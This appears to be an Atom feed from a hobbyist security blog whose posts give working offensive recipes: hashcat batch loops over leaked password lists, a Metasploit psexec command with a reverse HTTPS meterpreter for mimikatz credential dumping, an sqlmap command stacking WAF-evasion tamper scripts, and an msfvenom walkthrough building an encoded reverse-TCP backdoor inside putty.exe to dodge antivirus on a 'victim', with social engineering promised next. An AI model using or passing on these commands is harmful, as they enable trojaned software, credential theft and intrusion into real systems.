@@ -1,0 +1,260 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-04T23:30:03+00:00</updated><id>/feed.xml</id><title type="html">1337Newbs</title><subtitle>Security Blog</subtitle><entry><title type="html">Server Check In and Update</title><link href="/jekyll/update/2019/03/04/Server-Check-in.html" rel="alternate" type="text/html" title="Server Check In and Update" /><published>2019-03-04T00:00:00+00:00</published><updated>2019-03-04T00:00:00+00:00</updated><id>/jekyll/update/2019/03/04/Server-Check-in</id><content type="html" xml:base="/jekyll/update/2019/03/04/Server-Check-in.html">&lt;h1 id=&quot;server-check-in&quot;&gt;Server Check In&lt;/h1&gt;
+&lt;h2 id=&quot;ssh-user-list-generation-from-log-files-on-the-blog&quot;&gt;SSH user list generation from log files on the blog&lt;/h2&gt;
+
+&lt;p&gt;After neglecting the blog for awhile I decided to check in to see if everything was still up and operational. The SSL cert needed updating but it seems everything else was still running strong. I figured I would poke around the logs of the system to make make a user name list from the attempted SSH logins.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep 'Failed password for invalid' /var/log/secure* | cut -d ' ' -f 12 | sort -u
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here are the results&lt;br /&gt;
+&lt;a href=&quot;https://1337newbs.com/text/ssh_users.txt&quot;&gt;ssh_users.txt&lt;/a&gt;&lt;br /&gt;
+I also pulled out the URL’s that have been requested in the apache log.&lt;br /&gt;
+&lt;a href=&quot;https://1337newbs.com/text/urls.txt&quot;&gt;urls.txt&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Server Check In SSH user list generation from log files on the blog</summary></entry><entry><title type="html">Loop OclHashcat through multiple rule files</title><link href="/2016/08/13/OclHashcat.html" rel="alternate" type="text/html" title="Loop OclHashcat through multiple rule files" /><published>2016-08-13T00:00:00+00:00</published><updated>2016-08-13T00:00:00+00:00</updated><id>/2016/08/13/OclHashcat</id><content type="html" xml:base="/2016/08/13/OclHashcat.html">&lt;h2 id=&quot;loop-oclhashcat-through-multiple-rule-files&quot;&gt;Loop OclHashcat through multiple rule files&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;download latest https://hashcat.net/oclhashcat/#downloadlatest&lt;/li&gt;
+  &lt;li&gt;in the extract folder create a dictionaries folder and put them in there&lt;/li&gt;
+  &lt;li&gt;download seclists for rockyou.txt (https://github.com/danielmiessler/SecLists) and linkedin wordlist here (https://hashes.org/public.php). It’s called like L1nk3d1n or something–61 million passwords. more recent password lists are better&lt;/li&gt;
+  &lt;li&gt;run the command “dir /b” on the rules directory and save the output to rule_list.txt in the root oclhashcat directory.&lt;/li&gt;
+  &lt;li&gt;save your hashes in the root oclhashcat directory too in hashes.txt&lt;/li&gt;
+  &lt;li&gt;make a results folder to store your results in from the oclhashcat root&lt;/li&gt;
+  &lt;li&gt;save this script in oclhashcat directory:
+    &lt;ul&gt;
+      &lt;li&gt;this batch script will take all of the rule sets in the rule_list.txt and run it against the hashes.txt file and the rockyou.txt dictionary, and store the results in that folder. You can do a loop inside a loop to cycle through multiple dictionaries, but this gets most user hashes I run into with just rockyou.txt. For the next round, swap out the rockyou.txt for the linkedin dictionary&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@echo off
+for /f &quot;tokens=*&quot; %%a in (rule_list.txt) do (
+	oclHashcat64.exe -a 0 -m 5600 -o results/%%a -r rules/%%a hashes.txt dictionaries/rockyou.txt
+)
+pause
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;loop-oclhashcat-through-multiple-dictionary-and-rule-files&quot;&gt;Loop OclHashcat through multiple dictionary and rule files.&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;follow the same install instructions from above&lt;/li&gt;
+  &lt;li&gt;run the command “dir /b” on the dictionary directory and save the outpit to dictionary_list.txt in the root oclhashcat directory.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@echo off
+for /f &quot;tokens=*&quot; %%a in (dictionary_list.txt) do (
+    for /f &quot;tokens=*&quot; %%b in (rule_list.txt) do (
+        oclHashcat64.exe -a 0 -m 5600 -o results/client.txt -r rules/%%b hashes.txt dictionaries/%%a
+    )
+)
+pause
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Have fun :)&lt;/p&gt;</content><author><name></name></author><summary type="html">Loop OclHashcat through multiple rule files</summary></entry><entry><title type="html">Dumping clear text passwords</title><link href="/jekyll/update/2016/08/11/mimikatz.html" rel="alternate" type="text/html" title="Dumping clear text passwords" /><published>2016-08-11T00:00:00+00:00</published><updated>2016-08-11T00:00:00+00:00</updated><id>/jekyll/update/2016/08/11/mimikatz</id><content type="html" xml:base="/jekyll/update/2016/08/11/mimikatz.html">&lt;h1 id=&quot;mikatz---dumping-clear-text-passwords&quot;&gt;Mikatz - Dumping clear text passwords&lt;/h1&gt;
+
+&lt;h2 id=&quot;this-video-will-show-you-how-to-dump-clear-text-passwords-using-the-mimikatz-post-module-within-metasploit&quot;&gt;This video will show you how to dump clear text passwords using the mimikatz post module within Metasploit.&lt;/h2&gt;
+
+&lt;video width=&quot;720&quot; height=&quot;405&quot; autoplay=&quot;&quot; controls=&quot;&quot; poster=&quot;&quot;&gt;
+	&lt;source src=&quot;http://s1.webmshare.com/Vz1aj.webm&quot; type=&quot;video/webm&quot; /&gt;
+	Your browser does not support the video tag or the file format of this video. &lt;a href=&quot;http://www.webestools.com/&quot;&gt;http://www.webestools.com/&lt;/a&gt;
+&lt;/video&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/windows/smb/psexec_psh
+set payload windows/meterpreter/reverse_https
+set smbuser &amp;lt;username&amp;gt;
+set smbpass &amp;lt;password/hash&amp;gt;
+set smbdomain &amp;lt;domain&amp;gt;
+set RHOST &amp;lt;remote-ip&amp;gt;
+set LHOST &amp;lt;local-machine&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Mikatz - Dumping clear text passwords</summary></entry><entry><title type="html">sqlmap Tamper Scripts</title><link href="/jekyll/update/2016/04/18/sqlmap-tamper.html" rel="alternate" type="text/html" title="sqlmap Tamper Scripts" /><published>2016-04-18T00:00:00+00:00</published><updated>2016-04-18T00:00:00+00:00</updated><id>/jekyll/update/2016/04/18/sqlmap-tamper</id><content type="html" xml:base="/jekyll/update/2016/04/18/sqlmap-tamper.html">&lt;h1 id=&quot;sql-map&quot;&gt;sql map&lt;/h1&gt;
+&lt;p&gt;You all prob know about SQLmap’s ability to load tamper script rules to evade filters and WAF’s but what I didn’t know until recently was that you can use all of them in one line like so:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;general-tamper-testing&quot;&gt;General Tamper testing:&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;mssql&quot;&gt;MSSQL:&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;mysql&quot;&gt;MYSQL:&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">sql map You all prob know about SQLmap’s ability to load tamper script rules to evade filters and WAF’s but what I didn’t know until recently was that you can use all of them in one line like so:</summary></entry><entry><title type="html">Badlock</title><link href="/2016/03/23/16-badlock.html" rel="alternate" type="text/html" title="Badlock" /><published>2016-03-23T00:00:00+00:00</published><updated>2016-03-23T00:00:00+00:00</updated><id>/2016/03/23/16-badlock</id><content type="html" xml:base="/2016/03/23/16-badlock.html">&lt;p&gt;&lt;img src=&quot;http://badlock.org/badlock.png&quot; alt=&quot;alt text&quot; title=&quot;Logo Title Text 1&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;badlock&quot;&gt;Badlock&lt;/h1&gt;
+&lt;p&gt;Name, website, pre-accouned vulnerability… This must be serious. Or at least that is what is implied.&lt;/p&gt;
+
+&lt;p&gt;“On April 12th, 2016 a crucial security bug in Windows and Samba will be disclosed. We call it: Badlock. Engineers at Microsoft and the Samba Team are working together to get this problem fixed. Patches will be released on April 12th,” the website says.&lt;/p&gt;
+
+&lt;p&gt;“Please get yourself ready to patch all systems on this day. We are pretty sure that there will be exploits soon after we publish all relevant information.”&lt;/p&gt;
+
+&lt;p&gt;It should be no surprise to anyone that Microsoft has a long history of vulnerabilities (over 3,200 across 489 products lifetime, with a 7.38 CVSSv2 average score according to VulnDB). Samba on the other hand, is well-known in IT circles but may be unfamiliar to many consumers. More than 100 vulnerabilities have been found in Samba over the past years. The most serious issue patched in 2015 is a remote code execution vulnerability (CVE-2015-0240) that had been assigned a CVSS score of 10.&lt;/p&gt;</content><author><name></name></author><summary type="html">Badlock Name, website, pre-accouned vulnerability… This must be serious. Or at least that is what is implied.</summary></entry><entry><title type="html">msfvenom walkthrough</title><link href="/2016/03/22/16-MsfVenom-Walkthrough.html" rel="alternate" type="text/html" title="msfvenom walkthrough" /><published>2016-03-22T00:00:00+00:00</published><updated>2016-03-22T00:00:00+00:00</updated><id>/2016/03/22/16-MsfVenom-Walkthrough</id><content type="html" xml:base="/2016/03/22/16-MsfVenom-Walkthrough.html">&lt;p&gt;&lt;img src=&quot;http://www.interpretermag.com/wp-content/uploads/2014/03/hacker-grenade.jpg&quot; alt=&quot;alt text&quot; title=&quot;Logo Title Text 1&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;how-to-create-a-payload-with-msf-venom&quot;&gt;How to create a payload with MSF Venom&lt;/h2&gt;
+&lt;p&gt;Hello 1337 newbs. Today we will go over how to create and obfuscate a reverse TCP shell through MSF Venom. I will be using Kali 2.0 to complete this so feel free to follow along.&lt;/p&gt;
+
+&lt;p&gt;To launch a successful attack you will need to be able to bypass anti-virus software or other host-based protection for successful exploitation. The most effective way to avoid anti-virus detection on your target’s computers is to create your own customized back-door. We can leverage the built in ability to obfuscate payloads within commonly used files. In this example I will use putty.exe to supply the payload and we will use MSF Venom’s encoder to hide the payload from Anti-virus.&lt;/p&gt;
+
+&lt;h4 id=&quot;disclaimer---this-method-will-probably-not-bypass-an-up-to-date-anti-virus&quot;&gt;Disclaimer - This method will probably not bypass an up to date anti-virus&lt;/h4&gt;
+
+&lt;h3 id=&quot;msf-venom&quot;&gt;MSF Venom&lt;/h3&gt;
+&lt;p&gt;msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Note: msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ msfvenom --help
+MsfVenom - a Metasploit standalone payload generator.
+Also a replacement for msfpayload and msfencode.
+Usage: /usr/bin/msfvenom [options] &amp;lt;var=val&amp;gt;
+
+Options:
+    -p, --payload       &amp;lt;payload&amp;gt;    Payload to use. Specify a '-' or stdin to use custom payloads
+        --payload-options            List the payload's standard options
+    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
+    -n, --nopsled       &amp;lt;length&amp;gt;     Prepend a nopsled of [length] size on to the payload
+    -f, --format        &amp;lt;format&amp;gt;     Output format (use --help-formats for a list)
+        --help-formats               List available formats
+    -e, --encoder       &amp;lt;encoder&amp;gt;    The encoder to use
+    -a, --arch          &amp;lt;arch&amp;gt;       The architecture to use
+        --platform      &amp;lt;platform&amp;gt;   The platform of the payload
+        --help-platforms             List available platforms
+    -s, --space         &amp;lt;length&amp;gt;     The maximum size of the resulting payload
+        --encoder-space &amp;lt;length&amp;gt;     The maximum size of the encoded payload (defaults to the -s value)
+    -b, --bad-chars     &amp;lt;list&amp;gt;       The list of characters to avoid example: '\x00\xff'
+    -i, --iterations    &amp;lt;count&amp;gt;      The number of times to encode the payload
+    -c, --add-code      &amp;lt;path&amp;gt;       Specify an additional win32 shellcode file to include
+    -x, --template      &amp;lt;path&amp;gt;       Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+    -o, --out           &amp;lt;path&amp;gt;       Save the payload
+    -v, --var-name      &amp;lt;name&amp;gt;       Specify a custom variable name to use for certain output formats
+        --smallest                   Generate the smallest possible payload
+    -h, --help                       Show this message
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lets take a look at some useful options&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-p designates the Metasploit payload we want to use&lt;/li&gt;
+  &lt;li&gt;-e designates the encoder we want to use&lt;/li&gt;
+  &lt;li&gt;-a designates the architecture we want to use (default is x86)&lt;/li&gt;
+  &lt;li&gt;-s designates the maximum size of the payload&lt;/li&gt;
+  &lt;li&gt;-i designates the number of iterations with which to encode the payload&lt;/li&gt;
+  &lt;li&gt;-x designates a custom executable file to use as a template ```&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;encoders&quot;&gt;Encoders&lt;/h2&gt;
+&lt;p&gt;Encoders are the various algorithms and encoding schemes that Metasploit can use to re-encode the payloads.
+We can looks at these by typing&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ msfvemon -l encoders
+Framework Encoders
+==================
+
+    Name                          Rank       Description
+    ----                          ----       -----------
+    cmd/echo                      good       Echo Command Encoder
+    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
+    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
+    cmd/perl                      normal     Perl Command Encoder
+    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
+    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
+    generic/eicar                 manual     The EICAR Encoder
+    generic/none                  normal     The &quot;none&quot; Encoder
+    mipsbe/byte_xori              normal     Byte XORi Encoder
+    mipsbe/longxor                normal     XOR Encoder
+    mipsle/byte_xori              normal     Byte XORi Encoder
+    mipsle/longxor                normal     XOR Encoder
+    php/base64                    great      PHP Base64 Encoder
+    ppc/longxor                   normal     PPC LongXOR Encoder
+    ppc/longxor_tag               normal     PPC LongXOR Encoder
+    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
+    x64/xor                       normal     XOR Encoder
+    x86/add_sub                   manual     Add/Sub Encoder
+    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
+    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
+    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
+    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
+    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
+    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
+    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
+    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
+    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
+    x86/countdown                 normal     Single-byte XOR Countdown Encoder
+    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
+    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
+    x86/nonalpha                  low        Non-Alpha Encoder
+    x86/nonupper                  low        Non-Upper Encoder
+    x86/opt_sub                   manual     Sub Encoder (optimised)
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+    x86/single_static_bit         manual     Single Static Bit
+    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
+    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We will use x86\shikate_ga_nai in our example&lt;/p&gt;
+
+&lt;h2 id=&quot;building-the-payload&quot;&gt;Building the Payload&lt;/h2&gt;
+
+&lt;p&gt;I will start with our completed command and we then we will analyze each option in more detail.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\x00'-a x64 LHOST=10.1.10.2 LPORT=443 -x ~/Windows/Programs/putty.exe -f exe &amp;gt; ~/payloads/windows/EvilPutty.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;-p windows/meterpreter/reverse_tcp
+    &lt;ul&gt;
+      &lt;li&gt;Payload to use. A list can be found by using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; and then entering &lt;code class=&quot;highlighter-rouge&quot;&gt;show payloads&lt;/code&gt; at the msfconsole prompt.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;-e x86/shikata_ga_nai
+    &lt;ul&gt;
+      &lt;li&gt;Encoder - This is the algorithm that is used to encode your shell code in attempts to bypass anti-vurs. shikata_ga_nai is a polymorphic shell code encoder. More can be read about it on the web.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;-i 20
+    &lt;ul&gt;
+      &lt;li&gt;Iterations - this is the number of time your payload will be encoded.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;-b
+    &lt;ul&gt;
+      &lt;li&gt;Bad Characters - A bad character is simply a list of unwanted characters that can break the shell codes. Depending on the application and the developer logic there is a different set of bad characters for every program that we would encounter. Some common ones include
+        &lt;ul&gt;
+          &lt;li&gt;00 for NULL&lt;/li&gt;
+          &lt;li&gt;OA for Line Feed \n&lt;/li&gt;
+          &lt;li&gt;OD for Carriage Return \r&lt;/li&gt;
+          &lt;li&gt;FF for Form Feed \f&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;-a x86
+    &lt;ul&gt;
+      &lt;li&gt;This is the architecture of the program we are hiding our payload in.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;LHOST=
+    &lt;ul&gt;
+      &lt;li&gt;Listening Host - This will be the IP that we want our reverse TCP shell to call back too.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;LPORT=
+    &lt;ul&gt;
+      &lt;li&gt;Listening Port - This will be the port our host is listening on.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;-x ~/windows/Programs/putty.exe
+    &lt;ul&gt;
+      &lt;li&gt;Template - This is the path to the program we want to use as a template.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;-f
+    &lt;ul&gt;
+      &lt;li&gt;Format - This is the output format we want.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&amp;gt; ~/payloads/windows/EvilPutty.exe
+    &lt;ul&gt;
+      &lt;li&gt;This is the output file.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;wrapping-it-up&quot;&gt;Wrapping it up&lt;/h1&gt;
+&lt;p&gt;Although this method might not work every time, there is a very good possibility that the victim might not have anti-virus installed or turned on their machine. The next step would be coming up with a way to get someone to run this payload. There are many ways to do this. Next time we will cover some ways to social engineer someone to run this payload on their machine for you.&lt;/p&gt;</content><author><name></name></author><summary type="html"></summary></entry></feed>
